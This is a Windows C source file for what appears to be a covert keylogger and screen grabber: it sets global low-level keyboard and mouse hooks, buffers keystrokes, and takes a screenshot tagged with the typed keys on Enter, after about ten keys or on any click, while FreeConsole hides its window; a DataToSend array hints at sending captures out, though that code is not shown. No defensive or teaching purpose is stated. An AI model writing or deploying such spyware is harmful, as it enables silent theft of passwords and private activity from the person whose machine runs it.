#include <stdio.h>
#include "shooter.h"
#include <windows.h>
#include "auxfunc.h"

int counter = 0;
char logger[100];




// set up keyboard hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    printf("Setting up hook.\n");
    if(nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT *keyInfo = (KBDLLHOOKSTRUCT *)lParam;
        if (keyInfo->vkCode == VK_RETURN)
        {
            logger[counter] = '\0';
            const char* fileName = nameFile();
            if(fileName != NULL)
            {
                CaptureScreen(fileName, 20, logger);
                counter = 0;
            }
        }
        else{
            if (wParam == WM_KEYUP) {
            //if (wParam == WM_KEYDOWN) {
                int keyCode = (int)keyInfo->vkCode;
                if(counter < 10)
                {
                    logger[counter] = (char)keyCode;
                    logger[counter + 1] = '\0';
                    counter ++;
                }
                else{
                    logger[counter] = (char)keyCode;
                    logger[counter + 1] = '\0';
                    const char* fileName = nameFile();
                    if(fileName != NULL)
                    {
                        CaptureScreen(fileName, 20, logger);
                        counter = 0;
                    }

                };
            // if(keyCode >= 65 && keyCode <=90){
                //   if(counter < 5){
                //     logger[counter] = (char)keyCode;
                    //   logger[counter + 1] = '\0';
                    // counter++;
                    //}
                    //else{
                    //  logger[counter] = (char)keyCode;
                        //logger[counter + 1] = '\0';
                        //char* fileName = nameFile();
                        //CaptureScreen(fileName, 20, logger);
                        //counter = 0;
                    //}

                //}
                //else{
                //  char* fileName = nameFile();
                    //CaptureScreen(fileName, 20, logger);
                    //counter = 0;
                //}
            }
        }
    }
    printf("Keyboard Hook set.\n");
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// set up mouse hook
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    printf("Setting up mouse gook.\n");
    if(nCode == HC_ACTION)
    {
        if(wParam == WM_LBUTTONUP || wParam == WM_RBUTTONUP || wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN )
        {
            const char* fileName = nameFile();
            if(fileName != NULL)
            {
                logger[counter + 1] = '\0';
                CaptureScreen(fileName, 20, logger);
                counter = 0;
            }
        }
    }
    printf("Mouse hook set.\n");
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

    // initialize data to zero
    
    
    DataToSend listOfPending[MAX_THREADS] = {0};    // Initialize all data to NULL for pointers and empty strings for arrays
    HANDLE threadHandles[MAX_THREADS];
    


// main entry
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE prevhInstance, LPSTR cmdlarg, int nCmdShow) {
   FreeConsole();

    printf("Cleaning Slate");
    for (int i = 0; i < MAX_THREADS; i++)
    {
        threadHandles[i] = NULL;
    }   // initialize all handles to null
    printf("SlATE Clean.\n");

    printf("Program entereed\n");

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);  // Set hook globally
    HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);
    if (hook == NULL) {
        printf("Error setting hook\n");
        return 1;
    }
    if(mouseHook ==NULL){
        printf("Error setting mouse hook.\n");
        return 1;
    }
    
///
    // Capture the screen and save it as a JPEG file with high compression (quality 30)
    // Message loop to keep the hook active
    MSG msg;
    
    while (GetMessage(&msg, NULL, 0, 0) != 0) {  // Event loop
        printf("New message\n");
        TranslateMessage(&msg);  // Translate virtual key codes to characters
        printf("Message translated\n");
        DispatchMessage(&msg);   // Dispatch to window procedure (if any)
        printf("message dispatched\n");
    }
    printf("ended\n");

    UnhookWindowsHookEx(hook);
    UnhookWindowsHookEx(mouseHook);
    return 0;
}

// removing mouse hook for test